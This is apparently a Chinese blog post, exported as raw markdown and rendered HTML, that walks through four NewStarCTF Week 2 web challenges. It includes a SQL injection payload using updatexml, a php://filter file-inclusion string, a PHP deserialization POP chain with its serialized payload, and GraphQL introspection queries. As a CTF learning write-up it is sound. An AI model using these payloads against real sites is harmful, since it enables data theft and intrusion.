}\n```\n\n我们将Easy钟大哥cla设置为eeee类会触发**__clone**\n\n```php\npublic function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n```\n\n由于eeee类中没有cm'd属性，这里调用会触发**__isset**\n\n我们将eeee中的obj设置为Start类\n\n```php\npublic function __isset($var)\n    {\n        ($this->func)();\n    }\n```\n\n这里的 **($this->func)();**可以出发**__invoke**\n\n我们将Start中的func改为Sec类即可出发成功\n\n```php\npublic function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n```\n\n**pop链**\n\n```php\n<?php\n//error_reporting(0);\n//highlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start{\n    public $name;\n    public $func;\n    public function __construct(){\n        $this->func=new Sec();\n        $this->name=new Sec();\n    }\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n\n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\n\nclass Sec{\n    public $obj;\n    public $var;\n    public function __construct(){\n        $this->obj=new Easy();\n\n    }\n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n\n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n\nclass Easy{\n    public $cla;\n\n    public function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n}\n\nclass eeee{\n    public $obj;\n    \n    public function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n}\n$c=new eeee();\n$a=new Start();\n$c->obj=$a;\n$b=new Sec();\n$b->var=$c;\n$a->name=$b;\necho serialize($c);\n\n\n```\n\n```php\n?pop=O:4:\"eeee\":1:{s:3:\"obj\";O:5:\"Start\":2:{s:4:\"name\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";r:1;}s:4:\"func\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";N;}}}\n```\n\n## 4.ezAPI\n\n进去后访问www.zip获取源码\n\n```\n<html>\n    <body>\n        <center>\n            <h1>Search Page</h1><br>\n            <hr><br>\n            <form action=\"\" method=\"post\">\n            请输入用户ID: \n            <input type=\"text\" name=\"id\">\n            <input type=\"submit\" value=\"Search\">\n            </form>\n<?php\nerror_reporting(0);\n$id = $_POST['id'];\nfunction waf($str){\n    if(!is_numeric($str) || preg_replace(\"/[0-9]/\",\"\",$str) !== \"\"){#判断是否为数字字符串如果不是或者如果替换掉里的数字不为空就返回False,需要全部都不满足\n        return False;\n    }else{\n        return True;\n    }\n}\n\nfunction send($data)\n{\n    $options = array(\n        'http' => array(\n            'method' => 'POST',\n            'header' => 'Content-type: application/json',\n            'content' => $data,\n            'timeout' => 10 * 60\n        )\n    );\n    $context = stream_context_create($options);\n    $result = file_get_contents(\"http://graphql:8080/v1/graphql\", false, $context);\n    return $result;\n}\n\nif(isset($id)){\n    if(waf($id)){\n        isset($_POST['data']) ? $data=$_POST['data'] : $data='{\"query\":\"query{\\nusers_user_by_pk(id:'.$id.') {\\nname\\n}\\n}\\n\", \"variables\":null}';\n        $res = json_decode(send($data));\n        if($res->data->users_user_by_pk->name !== NULL){\n            echo \"ID: \".$id.\"<br>Name: \".$res->data->users_user_by_pk->name;\n        }else{\n            echo \"<b>Can't found it!</b><br>DEBUG: \";\n            var_dump($res->data);\n        }\n    }else{\n        die(\"<b>Hacker!</b>\");\n    }\n}else{\n    die(\"<b>No Data?</b>\");\n}\n?>\n</center>\n</body>\n</html>\n\n```\n\n这里给一篇graphQL的资料\n\nhttps://blog.csdn.net/wy_97/article/details/110522150\n\n如果我们post了一个data，就不会执行后面的文件，我们查看graphQL的api后能完全控制语句\n\n用内省查询获取所以数据\n\n```\nid=1&data={\"query\":\"query{\\n  __schema {\\n  types {\\n name  \\n }\\n}\\n}\\n\", \"variables\":null}\n```\n\n![图片-1665405825041](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702655.png)\n\n```\nid=1&data={\"query\":\"query{ffffllllaaagggg_1n_h3r3_flag {flag}}\",\"variables\":null}\n```\n\n```\nflag{4a902c8e-a8b5-ecfb-bee3-d6419865647c}\n```","source":"_posts/NewStarCTF WEEK2 WEB.md","raw":"---\ntitle: NewStarCTF WEEK2 WEB\ndate: 2022-10-10 23:11:51\nexcerpt: NewStarCTF WEEK2 WEB\ncategories: 复现\n---\n\n\n\n# NewStarCTF WEEK2 WEB\n\n## 1.Word-For-You(2 Gen)\n\n\n首先我们来试一下万能密码\n\n\n\n```sql\n1' or 1=1#\n```\n\n![图片-1665405773483](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701146.png)\n\n发现没有什么用，我们尝试一下报错注入\n\n![图片-1665405782381](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701158.png)\n\n这里爆出了库名~wfy，说明我们可以利用报错注入，接着我们爆列表\n\n这里一共爆了三个列表\n\n```sql\nXPATH syntax error: '~wfy_admin,wfy_comments,wfy_info'    \n```\n\n这里我们都试了一遍，发现flag在wfy_comments里面，我们查一下里面\n\n```sql\n1’||updatexml(1,concat(0x7e,(select reverse(group_concat(text)) from wfy_comments)),1)#\n```\n\n```sql\nXPATH syntax error: '~}sr0rre_emos_ek2m_t4uJ{galf,难'    //得到逆序flag\n```\n\n\n\n## 2.IncludeOne\n\n题目源代码：\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"seed.php\");\n//mt_srand(*********);//设置随机数种子\necho \"Hint: \".mt_rand().\"<br>\";//已知第一个随机数种子为：1219893521\nif(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){//md5强类型\n    if(!preg_match(\"/base|\\.\\./i\",$_GET['file']) &&//过滤base preg_match(\"/NewStar/i\",$_GET['file']) && isset($_GET['file'])){\n       //要求存在NewStar字符串，并且有file参数\n        //flag in `flag.php`\n        include($_GET['file']);//文件包含漏洞\n    }else{\n        echo \"Baby Hacker?\";\n    }\n}else{\n    echo \"No Hacker!\";\n} Hint: 1219893521\nNo Hacker!\n```\n\n题目这里给了一个链接：https://www.openwall.com/php_mt_seed/\n\n这里大概讲的就是随机数种子的漏洞\n\n当我们知道随机数种子后，后面的随机数无论在哪里运行都是有可预见性的\n\n```php\n<?php  \nmt_srand(12345);    \necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\necho mt_rand().\"<br/>\";\n?>    \n162946439\n\n247161732\n\n1463094264\n\n1878061366\n\n394962642\n```\n\n当随机数种子设置成12345时，前五个随机数都是一样的，于是这个题目就有了思路，我们已知第一个随机数，可以用工具爆破出种子，然后我们用种子读第二个随机数，然后文件读取\n\n![图片-1665405798622](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702046.png)\n\n这里爆出随机数种子为1145146\n\n我们用种子去跑第二个随机数：1202031004\n\n然后post传值\n\n接着就是文件包含，这题过滤了base我们可以用rot13编码（编码的形式有许多种）\n\n```php\n?file=php://filter/read=string.rot13/resource=flag.php\n```\n\n我发现这题必须要包含NewStar这个字符串，于是我们改成\n\n```php\n?file=php://filter/NewStar/read=string.rot13/resource=flag.php\n```\n\n```\nsynt{p1786p1p-rqr8-4524-n796-r3s84050oo92}\n```\n\nrot13解码得\n\n```\nflag{c1786c1c-ede8-4524-a796-e3f84050bb92}\n```\n\n## 3.UnserializeOne\n\n源代码：\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start{\n    public $name;\n    protected $func;\n\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n\n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\n\nclass Sec{\n    private $obj;\n    private $var;\n\n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n\n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n\nclass Easy{\n    public $cla;\n\n    public function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n}\n\nclass eeee{\n    public $obj;\n\n    public function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n}\n\nif(isset($_POST['pop'])){\n    unserialize($_POST['pop']);\n}\n\n```\n\n这个题目是考反序列化，利用点为\n\n```php\n echo file_get_contents('/flag');\n```\n\n- [x] __construct()，类的构造函数\n- __destruct()，类的析构函数\n- __call()，在对象中调用一个不可访问方法时调用\n- __callStatic()，用静态方式中调用一个不可访问方法时调用\n- __get()，获得一个类的成员变量时调用\n- __set()，设置一个类的成员变量时调用\n- __isset()，当对不可访问属性调用isset()或empty()时调用\n- __unset()，当对不可访问属性调用unset()时被调用。\n- __sleep()，执行serialize()时，先会调用这个函数\n- __wakeup()，执行unserialize()时，先会调用这个函数\n- __toString()，类被当成字符串时的回应方法\n- __invoke()，调用函数的方式调用一个对象时的回应方法\n- __set_state()，调用var_export()导出类时，此静态方法会被调用。\n- __clone()，当对象复制完成时调用\n- __autoload()，尝试加载未定义的类\n- __debugInfo()，打印所需调试信息\n\n这题目找pop链，一般我从**__destruct**开始，链终点是Sec类中的**__invoke**\n\n```php\npublic function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n```\n\n如果我们将这里的name改成类，由于echo会将类当成字符串可以触发**__tostring**\n\n我们将Start类中的name设置为Sec类\n\n```php\npublic function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n```\n\n由于这里的check方法没有被定义则会触发**__call**\n\n我们将Sec中的obj设置为Easy类\n\n```php\npublic function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n```\n\n我们将Easy钟大哥cla设置为eeee类会触发**__clone**\n\n```php\npublic function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n```\n\n由于eeee类中没有cm'd属性，这里调用会触发**__isset**\n\n我们将eeee中的obj设置为Start类\n\n```php\npublic function __isset($var)\n    {\n        ($this->func)();\n    }\n```\n\n这里的 **($this->func)();**可以出发**__invoke**\n\n我们将Start中的func改为Sec类即可出发成功\n\n```php\npublic function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n```\n\n**pop链**\n\n```php\n<?php\n//error_reporting(0);\n//highlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start{\n    public $name;\n    public $func;\n    public function __construct(){\n        $this->func=new Sec();\n        $this->name=new Sec();\n    }\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n\n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\n\nclass Sec{\n    public $obj;\n    public $var;\n    public function __construct(){\n        $this->obj=new Easy();\n\n    }\n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n\n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n\nclass Easy{\n    public $cla;\n\n    public function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n}\n\nclass eeee{\n    public $obj;\n    \n    public function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n}\n$c=new eeee();\n$a=new Start();\n$c->obj=$a;\n$b=new Sec();\n$b->var=$c;\n$a->name=$b;\necho serialize($c);\n\n\n```\n\n```php\n?pop=O:4:\"eeee\":1:{s:3:\"obj\";O:5:\"Start\":2:{s:4:\"name\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";r:1;}s:4:\"func\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";N;}}}\n```\n\n## 4.ezAPI\n\n进去后访问www.zip获取源码\n\n```\n<html>\n    <body>\n        <center>\n            <h1>Search Page</h1><br>\n            <hr><br>\n            <form action=\"\" method=\"post\">\n            请输入用户ID: \n            <input type=\"text\" name=\"id\">\n            <input type=\"submit\" value=\"Search\">\n            </form>\n<?php\nerror_reporting(0);\n$id = $_POST['id'];\nfunction waf($str){\n    if(!is_numeric($str) || preg_replace(\"/[0-9]/\",\"\",$str) !== \"\"){#判断是否为数字字符串如果不是或者如果替换掉里的数字不为空就返回False,需要全部都不满足\n        return False;\n    }else{\n        return True;\n    }\n}\n\nfunction send($data)\n{\n    $options = array(\n        'http' => array(\n            'method' => 'POST',\n            'header' => 'Content-type: application/json',\n            'content' => $data,\n            'timeout' => 10 * 60\n        )\n    );\n    $context = stream_context_create($options);\n    $result = file_get_contents(\"http://graphql:8080/v1/graphql\", false, $context);\n    return $result;\n}\n\nif(isset($id)){\n    if(waf($id)){\n        isset($_POST['data']) ? $data=$_POST['data'] : $data='{\"query\":\"query{\\nusers_user_by_pk(id:'.$id.') {\\nname\\n}\\n}\\n\", \"variables\":null}';\n        $res = json_decode(send($data));\n        if($res->data->users_user_by_pk->name !== NULL){\n            echo \"ID: \".$id.\"<br>Name: \".$res->data->users_user_by_pk->name;\n        }else{\n            echo \"<b>Can't found it!</b><br>DEBUG: \";\n            var_dump($res->data);\n        }\n    }else{\n        die(\"<b>Hacker!</b>\");\n    }\n}else{\n    die(\"<b>No Data?</b>\");\n}\n?>\n</center>\n</body>\n</html>\n\n```\n\n这里给一篇graphQL的资料\n\nhttps://blog.csdn.net/wy_97/article/details/110522150\n\n如果我们post了一个data，就不会执行后面的文件，我们查看graphQL的api后能完全控制语句\n\n用内省查询获取所以数据\n\n```\nid=1&data={\"query\":\"query{\\n  __schema {\\n  types {\\n name  \\n }\\n}\\n}\\n\", \"variables\":null}\n```\n\n![图片-1665405825041](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702655.png)\n\n```\nid=1&data={\"query\":\"query{ffffllllaaagggg_1n_h3r3_flag {flag}}\",\"variables\":null}\n```\n\n```\nflag{4a902c8e-a8b5-ecfb-bee3-d6419865647c}\n```","slug":"NewStarCTF WEEK2 WEB","published":1,"updated":"2024-04-17T08:42:59.686Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7ih0007h7764viadnd7","content":"<h1 id=\"NewStarCTF-WEEK2-WEB\"><a href=\"#NewStarCTF-WEEK2-WEB\" class=\"headerlink\" title=\"NewStarCTF WEEK2 WEB\"></a>NewStarCTF WEEK2 WEB</h1><h2 id=\"1-Word-For-You-2-Gen\"><a href=\"#1-Word-For-You-2-Gen\" class=\"headerlink\" title=\"1.Word-For-You(2 Gen)\"></a>1.Word-For-You(2 Gen)</h2><p>首先我们来试一下万能密码</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701146.png\"\n                        alt=\"图片-1665405773483\"\n                 ></p>\n<p>发现没有什么用，我们尝试一下报错注入</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701158.png\"\n                        alt=\"图片-1665405782381\"\n                 ></p>\n<p>这里爆出了库名~wfy，说明我们可以利用报错注入，接着我们爆列表</p>\n<p>这里一共爆了三个列表</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: <span class=\"string\">&#x27;~wfy_admin,wfy_comments,wfy_info&#x27;</span>    </span><br></pre></td></tr></table></figure>\n\n<p>这里我们都试了一遍，发现flag在wfy_comments里面，我们查一下里面</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>’<span class=\"operator\">||</span>updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> reverse(group_concat(text)) <span class=\"keyword\">from</span> wfy_comments)),<span class=\"number\">1</span>)#</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: <span class=\"string\">&#x27;~&#125;sr0rre_emos_ek2m_t4uJ&#123;galf,难&#x27;</span>    <span class=\"operator\">/</span><span class=\"operator\">/</span>得到逆序flag</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"2-IncludeOne\"><a href=\"#2-IncludeOne\" class=\"headerlink\" title=\"2.IncludeOne\"></a>2.IncludeOne</h2><p>题目源代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;seed.php&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//mt_srand(*********);//设置随机数种子</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Hint: &quot;</span>.<span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;<span class=\"comment\">//已知第一个随机数种子为：1219893521</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>()))&#123;<span class=\"comment\">//md5强类型</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/base|\\.\\./i&quot;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]) &amp;&amp;<span class=\"comment\">//过滤base preg_match(&quot;/NewStar/i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;file&#x27;]))&#123;</span></span><br><span class=\"line\">       <span class=\"comment\">//要求存在NewStar字符串，并且有file参数</span></span><br><span class=\"line\">        <span class=\"comment\">//flag in `flag.php`</span></span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);<span class=\"comment\">//文件包含漏洞</span></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Baby Hacker?&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;No Hacker!&quot;</span>;</span><br><span class=\"line\">&#125; Hint: <span class=\"number\">1219893521</span></span><br><span class=\"line\">No Hacker!</span><br></pre></td></tr></table></figure>\n\n<p>题目这里给了一个链接：<a class=\"link\"   href=\"https://www.openwall.com/php_mt_seed/\" >https://www.openwall.com/php_mt_seed/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>这里大概讲的就是随机数种子的漏洞</p>\n<p>当我们知道随机数种子后，后面的随机数无论在哪里运行都是有可预见性的</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">mt_srand</span>(<span class=\"number\">12345</span>);    </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>    </span><br><span class=\"line\"><span class=\"number\">162946439</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">247161732</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1463094264</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1878061366</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">394962642</span></span><br></pre></td></tr></table></figure>\n\n<p>当随机数种子设置成12345时，前五个随机数都是一样的，于是这个题目就有了思路，我们已知第一个随机数，可以用工具爆破出种子，然后我们用种子读第二个随机数，然后文件读取</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702046.png\"\n                        alt=\"图片-1665405798622\"\n                 ></p>\n<p>这里爆出随机数种子为1145146</p>\n<p>我们用种子去跑第二个随机数：1202031004</p>\n<p>然后post传值</p>\n<p>接着就是文件包含，这题过滤了base我们可以用rot13编码（编码的形式有许多种）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/read=string.rot13/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<p>我发现这题必须要包含NewStar这个字符串，于是我们改成</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/NewStar/read=string.rot13/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">synt&#123;p1786p1p-rqr8-4524-n796-r3s84050oo92&#125;</span><br></pre></td></tr></table></figure>\n\n<p>rot13解码得</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;c1786c1c-ede8-4524-a796-e3f84050bb92&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-UnserializeOne\"><a href=\"#3-UnserializeOne\" class=\"headerlink\" title=\"3.UnserializeOne\"></a>3.UnserializeOne</h2><p>源代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$var</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span 